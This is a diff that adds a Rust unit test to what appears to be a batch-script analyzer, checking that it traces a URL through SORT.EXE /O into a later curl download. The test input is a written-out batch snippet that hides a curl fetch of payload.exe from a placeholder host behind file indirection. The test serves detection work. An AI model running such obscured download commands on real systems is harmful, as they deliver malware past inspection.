@@ -3853,6 +3853,30 @@ for /f "tokens=* delims=" %%U in ('type sorted.txt ^| find "https://"') do curl 
     }
 
     #[test]
+    fn sort_exe_output_file_is_case_insensitive() {
+        let report = analyze(
+            br#"echo zzz>urls.txt
+echo https://sort-exe-output-file.example/payload.exe>>urls.txt
+SORT.EXE /O sorted.txt urls.txt
+for /f "tokens=* delims=" %%U in ('type sorted.txt ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://sort-exe-output-file.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "SORT.EXE /O output file did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_dir_b_discovers_generated_file_source() {
         let report = analyze(
             br#"echo https://for-f-dir-b.example/payload.exe>url.txt
